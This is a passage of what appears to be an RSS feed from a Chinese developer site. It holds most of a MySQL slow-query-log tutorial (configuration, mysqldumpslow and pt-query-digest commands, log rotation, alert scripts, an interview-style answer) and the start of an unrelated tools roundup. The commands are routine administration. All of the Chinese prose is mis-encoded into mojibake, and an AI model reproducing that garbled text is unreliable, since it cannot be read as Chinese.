SET GLOBAL <span class="hljs-attr">slow_query_log_file</span> = <span class="hljs-string">'/var/log/mysql/slow.log'</span><span class="hljs-comment">;</span>
SET GLOBAL <span class="hljs-attr">log_queries_not_using_indexes</span> = <span class="hljs-string">'ON'</span><span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-5">2. æ°¸ä¹…å¼€å¯ï¼ˆä¿®æ”¹é…ç½®æ–‡ä»¶ï¼‰</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># my.cnf æˆ– my.ini</span>
<span class="hljs-section">[mysqld]</span>
<span class="hljs-attr">slow_query_log</span> = <span class="hljs-number">1</span>
<span class="hljs-attr">slow_query_log_file</span> = /var/log/mysql/slow.log
<span class="hljs-attr">long_query_time</span> = <span class="hljs-number">2</span>
<span class="hljs-attr">log_queries_not_using_indexes</span> = <span class="hljs-number">1</span>
<span class="hljs-attr">log_output</span> = FILE
</code></pre>
<h3 data-id="heading-6">äº”ã€æ…¢æŸ¥è¯¢æ—¥å¿—æ ¼å¼åˆ†æ</h3>
<h4 data-id="heading-7">å…¸å‹æ—¥å¿—æ¡ç›®ï¼š</h4>
<pre><code class="hljs language-sql" lang="sql"># <span class="hljs-type">Time</span>: <span class="hljs-number">2024</span><span class="hljs-number">-01</span><span class="hljs-number">-01</span>T10:<span class="hljs-number">00</span>:<span class="hljs-number">00.123456</span>Z
# <span class="hljs-keyword">User</span><span class="hljs-variable">@Host</span>: root[root] @ localhost []  Id:     <span class="hljs-number">5</span>
# Query_time: <span class="hljs-number">5.123456</span>  Lock_time: <span class="hljs-number">0.001000</span>  Rows_sent: <span class="hljs-number">10</span>  Rows_examined: <span class="hljs-number">1000000</span>
<span class="hljs-keyword">SET</span> <span class="hljs-type">timestamp</span><span class="hljs-operator">=</span><span class="hljs-number">1672560000</span>;
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> last_name <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'%smith%'</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> create_time <span class="hljs-keyword">DESC</span>;
</code></pre>
<h4 data-id="heading-8">å…³é”®å­—æ®µè§£é‡Šï¼š</h4>
<ul>
<li><strong>Query_time</strong>ï¼šæŸ¥è¯¢æ‰§è¡Œæ€»æ—¶é—´</li>
<li><strong>Lock_time</strong>ï¼šé”å®šæ—¶é—´</li>
<li><strong>Rows_sent</strong>ï¼šè¿”å›ç»™å®¢æˆ·ç«¯çš„è¡Œæ•°</li>
<li><strong>Rows_examined</strong>ï¼šæ‰«æçš„è¡Œæ•°</li>
<li><strong>Rows_affected</strong>ï¼šå½±å“çš„è¡Œæ•°ï¼ˆUPDATE/DELETE/INSERTï¼‰</li>
</ul>
<h3 data-id="heading-9">å…­ã€æ…¢æŸ¥è¯¢åˆ†æå·¥å…·</h3>
<h4 data-id="heading-10">1. <strong>mysqldumpslow</strong>ï¼ˆMySQL è‡ªå¸¦ï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŒ‰æŸ¥è¯¢æ—¶é—´æ’åº</span>
mysqldumpslow -s t /var/log/mysql/slow.log

<span class="hljs-comment"># æŒ‰é”æ—¶é—´æ’åº</span>
mysqldumpslow -s l /var/log/mysql/slow.log

<span class="hljs-comment"># æŒ‰æ‰§è¡Œæ¬¡æ•°æ’åº</span>
mysqldumpslow -s c /var/log/mysql/slow.log

<span class="hljs-comment"># æ˜¾ç¤ºå‰10æ¡æœ€æ…¢çš„æŸ¥è¯¢</span>
mysqldumpslow -t 10 /var/log/mysql/slow.log

<span class="hljs-comment"># åˆ†æç‰¹å®šç”¨æˆ·çš„æ…¢æŸ¥è¯¢</span>
mysqldumpslow -a -g <span class="hljs-string">"root"</span> /var/log/mysql/slow.log
</code></pre>
<h4 data-id="heading-11">2. <strong>pt-query-digest</strong>ï¼ˆPercona Toolkitï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ†ææ…¢æŸ¥è¯¢æ—¥å¿—</span>
pt-query-digest /var/log/mysql/slow.log

<span class="hljs-comment"># åˆ†ææœ€è¿‘12å°æ—¶çš„æ…¢æŸ¥è¯¢</span>
pt-query-digest --since=12h /var/log/mysql/slow.log

<span class="hljs-comment"># è¾“å‡ºåˆ°æ–‡ä»¶</span>
pt-query-digest /var/log/mysql/slow.log &gt; slow_report.txt
</code></pre>
<h4 data-id="heading-12">3. <strong>mysqlslow</strong>ï¼ˆç¬¬ä¸‰æ–¹å·¥å…·ï¼‰</h4>
<pre><code class="hljs language-c" lang="c">mysqlslow /var/<span class="hljs-built_in">log</span>/mysql/slow.<span class="hljs-built_in">log</span>
</code></pre>
<h3 data-id="heading-13">ä¸ƒã€æ…¢æŸ¥è¯¢æ—¥å¿—è¡¨æ¨¡å¼</h3>
<h4 data-id="heading-14">å¯ç”¨è¡¨æ¨¡å¼å­˜å‚¨ï¼š</h4>
<pre><code class="hljs language-ini" lang="ini">SET GLOBAL <span class="hljs-attr">log_output</span> = <span class="hljs-string">'TABLE'</span><span class="hljs-comment">;</span>
SET GLOBAL <span class="hljs-attr">slow_query_log</span> = <span class="hljs-string">'ON'</span><span class="hljs-comment">;</span>

-- æŸ¥è¯¢æ…¢æŸ¥è¯¢æ—¥å¿—
SELECT * FROM mysql.slow_log<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-15">è¡¨ç»“æ„ï¼š</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> mysql.slow_log;

<span class="hljs-comment">-- ä¸»è¦å­—æ®µï¼š</span>
<span class="hljs-comment">-- start_time: æŸ¥è¯¢å¼€å§‹æ—¶é—´</span>
<span class="hljs-comment">-- query_time: æŸ¥è¯¢è€—æ—¶</span>
<span class="hljs-comment">-- lock_time: é”å®šæ—¶é—´</span>
<span class="hljs-comment">-- rows_sent: è¿”å›è¡Œæ•°</span>
<span class="hljs-comment">-- rows_examined: æ£€æŸ¥è¡Œæ•°</span>
<span class="hljs-comment">-- sql_text: SQLè¯­å¥</span>
<span class="hljs-comment">-- user_host: ç”¨æˆ·å’Œä¸»æœºä¿¡æ¯</span>
</code></pre>
<h3 data-id="heading-16">å…«ã€æœ€ä½³å®è·µå’Œä¼˜åŒ–å»ºè®®</h3>
<h4 data-id="heading-17">1. <strong>é˜ˆå€¼è®¾ç½®å»ºè®®</strong></h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- ç”Ÿäº§ç¯å¢ƒå»ºè®®</span>
<span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> long_query_time <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;    <span class="hljs-comment">-- 2ç§’é˜ˆå€¼</span>

<span class="hljs-comment">-- å¼€å‘/æµ‹è¯•ç¯å¢ƒå¯ä»¥æ›´ä¸¥æ ¼</span>
<span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> long_query_time <span class="hljs-operator">=</span> <span class="hljs-number">0.5</span>;  <span class="hljs-comment">-- 500æ¯«ç§’</span>

<span class="hljs-comment">-- å¾®ç§’çº§ç²¾åº¦ï¼ˆMySQL 5.7+ï¼‰</span>
<span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> long_query_time <span class="hljs-operator">=</span> <span class="hljs-number">0.1</span>;  <span class="hljs-comment">-- 100æ¯«ç§’</span>
</code></pre>
<h4 data-id="heading-18">2. <strong>æ—¥å¿—è½®è½¬é…ç½®</strong></h4>
<pre><code class="hljs language-lua" lang="lua"># ä½¿ç”¨ logrotate
/var/<span class="hljs-built_in">log</span>/mysql/slow.<span class="hljs-built_in">log</span> {
    daily
    rotate <span class="hljs-number">30</span>
    missingok
    compress
    delaycompress
    notifempty
    <span class="hljs-built_in">create</span> <span class="hljs-number">640</span> mysql mysql
    postrotate
        mysqladmin <span class="hljs-built_in">flush</span>-logs
    endscript
}
</code></pre>
<h4 data-id="heading-19">3. <strong>å®šæœŸåˆ†æè®¡åˆ’</strong></h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ¯æ—¥åˆ†æè„šæœ¬ç¤ºä¾‹</span>
<span class="hljs-comment">#!/bin/bash</span>
DATE=$(<span class="hljs-built_in">date</span> +%Y%m%d)
pt-query-digest /var/log/mysql/slow.log &gt; /var/log/mysql/slow_report_<span class="hljs-variable">${DATE}</span>.txt
<span class="hljs-comment"># æ¸…ç©ºæ—¥å¿—æ–‡ä»¶ï¼ˆå…ˆå¤‡ä»½ï¼‰</span>
<span class="hljs-built_in">cp</span> /var/log/mysql/slow.log /var/log/mysql/slow.log.<span class="hljs-variable">${DATE}</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span> &gt; /var/log/mysql/slow.log
</code></pre>
<h3 data-id="heading-20">ä¹ã€æ€§èƒ½ç›‘æ§å’Œå‘Šè­¦</h3>
<h4 data-id="heading-21">1. ç›‘æ§æ…¢æŸ¥è¯¢æ•°é‡</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- ç›‘æ§æ¯åˆ†é’Ÿçš„æ…¢æŸ¥è¯¢æ•°é‡</span>
<span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">GLOBAL</span> STATUS <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'Slow_queries'</span>;

<span class="hljs-comment">-- æŸ¥çœ‹å½“å‰æ…¢æŸ¥è¯¢</span>
<span class="hljs-keyword">SHOW</span> PROCESSLIST;
</code></pre>
<h4 data-id="heading-22">2. æ…¢æŸ¥è¯¢å‘Šè­¦è„šæœ¬</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
SLOW_COUNT=$(mysql -e <span class="hljs-string">"SHOW GLOBAL STATUS LIKE 'Slow_queries'"</span> | grep Slow_queries | awk <span class="hljs-string">'{print $2}'</span>)
THRESHOLD=100

<span class="hljs-keyword">if</span> [ <span class="hljs-variable">$SLOW_COUNT</span> -gt <span class="hljs-variable">$THRESHOLD</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"è­¦å‘Šï¼šæ…¢æŸ¥è¯¢æ•°é‡å¼‚å¸¸ï¼å½“å‰æ•°é‡: <span class="hljs-variable">$SLOW_COUNT</span>"</span> | mail -s <span class="hljs-string">"MySQLæ…¢æŸ¥è¯¢å‘Šè­¦"</span> admin@example.com
<span class="hljs-keyword">fi</span>
</code></pre>
<h3 data-id="heading-23">åã€æ³¨æ„äº‹é¡¹</h3>
<ol>
<li><strong>æ€§èƒ½å½±å“</strong>ï¼šå¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—ä¼šæœ‰çº¦1-3%çš„æ€§èƒ½å¼€é”€</li>
<li><strong>ç£ç›˜ç©ºé—´</strong>ï¼šå®šæœŸæ¸…ç†ï¼Œé¿å…æ—¥å¿—æ–‡ä»¶è¿‡å¤§</li>
<li><strong>æ•æ„Ÿä¿¡æ¯</strong>ï¼šæ—¥å¿—å¯èƒ½åŒ…å«æ•æ„Ÿæ•°æ®ï¼Œéœ€å¦¥å–„ä¿ç®¡</li>
<li><strong>ç”Ÿäº§ç¯å¢ƒ</strong>ï¼šå»ºè®®è®¾ç½®åˆç†çš„é˜ˆå€¼ï¼Œé¿å…è®°å½•è¿‡å¤šæ— å…³æŸ¥è¯¢</li>
<li><strong>ç‰ˆæœ¬å·®å¼‚</strong>ï¼šMySQL 5.7+ æ”¯æŒå¾®ç§’çº§ç²¾åº¦ï¼Œä¹‹å‰ç‰ˆæœ¬åªåˆ°ç§’</li>
</ol>
<h3 data-id="heading-24">é¢è¯•å›ç­”</h3>
<p>ç®€å•æ¥è¯´ï¼Œ<strong>æ…¢æŸ¥è¯¢æ—¥å¿—å°±åƒæ˜¯ MySQL çš„ä¸€ä¸ªâ€˜ç—…å†æœ¬â€™</strong>ã€‚å®ƒä¼šè‡ªåŠ¨è®°å½•ä¸‹æ¥æ‰€æœ‰æ‰§è¡Œæ—¶é—´è¶…è¿‡æŸä¸ªé˜ˆå€¼çš„ SQL è¯­å¥ã€‚è¿™æ ·æˆ‘ä»¬å¼€å‘æˆ–è€… DBA å°±èƒ½çŸ¥é“ï¼Œå“ªäº›æŸ¥è¯¢æ˜¯â€˜æ…¢â€™çš„ã€æœ‰é—®é¢˜çš„ï¼Œç„¶åå»é’ˆå¯¹æ€§åœ°ä¼˜åŒ–ã€‚</p>
<p>åœ¨å®é™…å·¥ä½œä¸­ï¼Œæˆ‘ä¸»è¦ä¼šå…³æ³¨å’Œæ“ä½œè¿™ä¹ˆå‡ ä¸ªæ–¹é¢ï¼š</p>
<p><strong>ç¬¬ä¸€ï¼Œæ€ä¹ˆå¼€å¯å’Œè®¾ç½®ã€‚</strong><br/>
æ…¢æŸ¥è¯¢æ—¥å¿—é»˜è®¤æ˜¯å…³é—­çš„ï¼Œå› ä¸ºå®ƒä¼šæœ‰ä¸€ç‚¹ç£ç›˜ I/O çš„å¼€é”€ã€‚æˆ‘ä»¬éœ€è¦åœ¨ MySQL é…ç½®æ–‡ä»¶ï¼ˆæ¯”å¦‚ <code>my.cnf</code>ï¼‰é‡Œè®¾ç½®å‡ ä¸ªæ ¸å¿ƒå‚æ•°ï¼š</p>
<ol>
<li><code>slow_query_log = ON</code>ï¼šæ‰“å¼€å¼€å…³ã€‚</li>
<li><code>slow_query_log_file</code>ï¼šæŒ‡å®šè¿™ä¸ªâ€˜ç—…å†æœ¬â€™æ–‡ä»¶å­˜å“ªé‡Œã€‚</li>
<li><code>long_query_time</code>ï¼šè¿™æ˜¯æœ€é‡è¦çš„ä¸€ä¸ªé˜ˆå€¼ï¼Œå•ä½æ˜¯ç§’ã€‚æ¯”å¦‚è®¾ä¸º 1ï¼Œå°±æ„å‘³ç€æ‰§è¡Œè¶…è¿‡ 1 ç§’çš„ SQL æ‰ä¼šè¢«è®°å½•ã€‚è¿™ä¸ªå€¼å¯ä»¥æ ¹æ®ç³»ç»Ÿæ€§èƒ½è¦æ±‚æ¥è°ƒæ•´ã€‚</li>
<li><code>log_queries_not_using_indexes</code>ï¼šè¿™ä¸ªæˆ‘ä¹Ÿç»å¸¸ä¼šæ‰“å¼€ã€‚å®ƒä¼šè®°å½•é‚£äº›æ²¡æœ‰ä½¿ç”¨ç´¢å¼•çš„æŸ¥è¯¢ï¼Œå³ä½¿å®ƒæ‰§è¡Œå¾—å¾ˆå¿«ã€‚è¿™èƒ½å¸®æˆ‘ä»¬å‘ç°æ½œåœ¨çš„è®¾è®¡é—®é¢˜ã€‚</li>
</ol>
<p><strong>ç¬¬äºŒï¼Œæ€ä¹ˆçœ‹è¿™ä¸ªæ—¥å¿—ã€‚</strong><br/>
æ—¥å¿—æ˜¯æ–‡æœ¬æ ¼å¼ï¼Œå¯ä»¥ç›´æ¥çœ‹ï¼Œä½†ä¸å¤ªç›´è§‚ã€‚æˆ‘å¸¸ç”¨çš„æ–¹æ³•æ˜¯ï¼š</p>
<ol>
<li>ç”¨ MySQL è‡ªå¸¦çš„ <code>mysqldumpslow</code> å·¥å…·ã€‚è¿™ä¸ªå‘½ä»¤è¡Œå·¥å…·å¯ä»¥å¯¹æ—¥å¿—è¿›è¡Œæ±‡æ€»ã€æ’åºï¼Œæ¯”å¦‚æˆ‘ä»¬å¯ä»¥ç”¨ <code>mysqldumpslow -t 10 -s t</code> æ¥æ‰¾å‡ºè€—æ—¶æœ€é•¿çš„å‰ 10 æ¡ SQLï¼Œä¸€ç›®äº†ç„¶ã€‚</li>
<li>å¯¹äºæ›´å¤æ‚çš„åˆ†æï¼Œæˆ‘ä¼šç”¨ <strong>Percona å…¬å¸å¼€çš„</strong> ****<code>pt-query-digest</code> å·¥å…·ã€‚å®ƒåŠŸèƒ½æ›´å¼ºå¤§ï¼Œèƒ½ç»™å‡ºéå¸¸è¯¦ç»†çš„æŠ¥å‘Šï¼Œæ¯”å¦‚æ¯ä¸ª SQL çš„å“åº”æ—¶é—´å æ¯”ã€æ‰§è¡Œæ¬¡æ•°ã€é”æ—¶é—´ç­‰ï¼Œèƒ½å¸®æˆ‘å¿«é€Ÿå®šä½æœ€éœ€è¦ä¼˜åŒ–çš„â€˜ç“¶é¢ˆâ€™ SQLã€‚</li>
</ol>
<p><strong>ç¬¬ä¸‰ï¼Œä¹Ÿæ˜¯æœ€é‡è¦çš„ï¼Œæ‰¾åˆ°æ…¢ SQL åæ€ä¹ˆåŠã€‚</strong><br/>
å…‰æ‰¾åˆ°æ²¡ç”¨ï¼Œå…³é”®æ˜¯è¦ä¼˜åŒ–ã€‚æˆ‘ä¸€èˆ¬çš„æ’æŸ¥æ€è·¯æ˜¯ï¼š</p>
<ol>
<li>æ‹¿åˆ°è¿™æ¡æ…¢ SQLï¼Œå…ˆ<strong>ç”¨</strong> <code>explain</code> <strong>å‘½ä»¤å»çœ‹å®ƒçš„æ‰§è¡Œè®¡åˆ’</strong>ã€‚è¿™æ˜¯æ ‡å‡†åŠ¨ä½œã€‚æˆ‘ä¼šé‡ç‚¹çœ‹ï¼š</li>
</ol>
<ul>
<li>
<ul>
<li>æœ‰æ²¡æœ‰ç”¨åˆ°ç´¢å¼•ï¼ˆ<code>key</code> å­—æ®µï¼‰ã€‚</li>
<li>æ‰«æäº†å¤šå°‘è¡Œï¼ˆ<code>rows</code> å­—æ®µï¼‰ã€‚</li>
<li>æŸ¥è¯¢ç±»å‹æ˜¯ä¸æ˜¯å…¨è¡¨æ‰«æï¼ˆ<code>type</code> å­—æ®µï¼Œå¦‚æœæ˜¯ <code>ALL</code> å°±ä¸å¥½äº†ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<ol start="2">
<li>æ ¹æ® ****<code>explain</code> ****çš„ç»“æœï¼Œå¸¸è§çš„ä¼˜åŒ–æ‰‹æ®µå°±æ˜¯ï¼š</li>
</ol>
<ul>
<li>
<ul>
<li><strong>åŠ ç´¢å¼•</strong>ï¼šè¿™æ˜¯æœ€æœ‰æ•ˆçš„åŠæ³•ä¹‹ä¸€ï¼Œæ£€æŸ¥ <code>WHERE</code>ã€<code>ORDER BY</code>ã€<code>JOIN</code> çš„å­—æ®µã€‚</li>
<li><strong>ä¼˜åŒ– SQL æœ¬èº«</strong>ï¼šæ¯”å¦‚é¿å… <code>SELECT *</code>ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰å¤æ‚çš„å­æŸ¥è¯¢èƒ½ä¸èƒ½æ”¹å†™ä¸º <code>JOIN</code>ï¼Œæˆ–è€…åˆ†é¡µæŸ¥è¯¢åœ¨å¤§åç§»é‡æ—¶æœ‰æ²¡æœ‰ä¼˜åŒ–ç©ºé—´ã€‚</li>
<li><strong>çœ‹çœ‹æ˜¯ä¸æ˜¯æ•°æ®åº“å‚æ•°é—®é¢˜</strong>ï¼Œæ¯”å¦‚ç¼“å†²æ± å¤§å°æ˜¯ä¸æ˜¯ä¸åˆç†ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<p><strong>æœ€åï¼Œæˆ‘çš„ä¸€ç‚¹å®è·µç»éªŒæ˜¯</strong>ï¼šæ…¢æŸ¥è¯¢æ—¥å¿—åœ¨æµ‹è¯•ç¯å¢ƒå’Œç”Ÿäº§ç¯å¢ƒéƒ½å¾ˆæœ‰ç”¨ã€‚åœ¨é¡¹ç›®ä¸Šçº¿å‰ï¼Œæˆ‘ä»¬ä¼šå¼€å¯å®ƒæ¥æå‰å‘ç°ä¸€äº›æ€§èƒ½é—®é¢˜ã€‚åœ¨ç”Ÿäº§ç¯å¢ƒï¼Œæˆ‘ä»¬ä¼šé•¿æœŸå¼€å¯ï¼Œä½†ä¼šè®¾ç½®ä¸€ä¸ªåˆç†çš„ <code>long_query_time</code>ï¼ˆæ¯”å¦‚ä» 2 ç§’å¼€å§‹ï¼‰ï¼Œå¹¶å®šæœŸå½’æ¡£å’Œåˆ†ææ—¥å¿—ï¼ŒæŠŠå®ƒä½œä¸ºæ€§èƒ½ç›‘æ§å’Œå®¹é‡è§„åˆ’çš„ä¸€ä¸ªé‡è¦ä¾æ®ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Šç‹¬ç«‹å¼€å‘è€…ç²¾é€‰å·¥å…·ã€‹ç¬¬ 025 æœŸ]]></title>    <link>https://juejin.cn/post/7590021144779800622</link>    <guid>https://juejin.cn/post/7590021144779800622</guid>    <pubDate>2026-01-02T08:54:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590021144779800622" data-draft-id="7590503651116318770" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Šç‹¬ç«‹å¼€å‘è€…ç²¾é€‰å·¥å…·ã€‹ç¬¬ 025 æœŸ"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯"/> <meta itemprop="datePublished" content="2026-01-02T08:54:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Immerse"/> <meta itemprop="url" content="https://juejin.cn/user/2708812817761752"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Šç‹¬ç«‹å¼€å‘è€…ç²¾é€‰å·¥å…·ã€‹ç¬¬ 025 æœŸ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2708812817761752/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Immerse
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T08:54:42.000Z" title="Fri Jan 02 2026 08:54:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.indietools.work" target="_blank" title="https://www.indietools.work" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/def28594012e425cae9795bb9c09aa78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=9rY12YucRDdMLZIua0uY%2BQ8NM2E%3D" alt="" loading="lazy"/></a></p>
<p>Indie Tools æ˜¯ä¸€ä¸ªæ”¶å½•ç‹¬ç«‹å¼€å‘ã€AI å‡ºæµ·é¢†åŸŸæœ€æ–°ã€æœ€å®ç”¨çš„å…è´¹å·¥å…·ä¸èµ„æºå·¥å…·ç«™ã€‚è®©ä½ å¿«é€Ÿæ‰¾åˆ°æ‰€éœ€ï¼Œä¸“æ³¨äºåˆ›é€ äº§å“ã€‚</p>
<p>ç‹¬ç«‹å¼€å‘è€…å¿…å¤‡ç½‘ç«™ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.indietools.work" target="_blank" title="https://www.indietools.work" ref="nofollow noopener noreferrer"><code>https://www.indietools.work</code></a></p>
<p>Github: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyaolifeng0629%2FAwesome-independent-tools" target="_blank" title="https://github.com/yaolifeng0629/Awesome-independent-tools" ref="nofollow noopener noreferrer"><code>https://github.com/yaolifeng0629/Awesome-independent-tools</code></a></p>
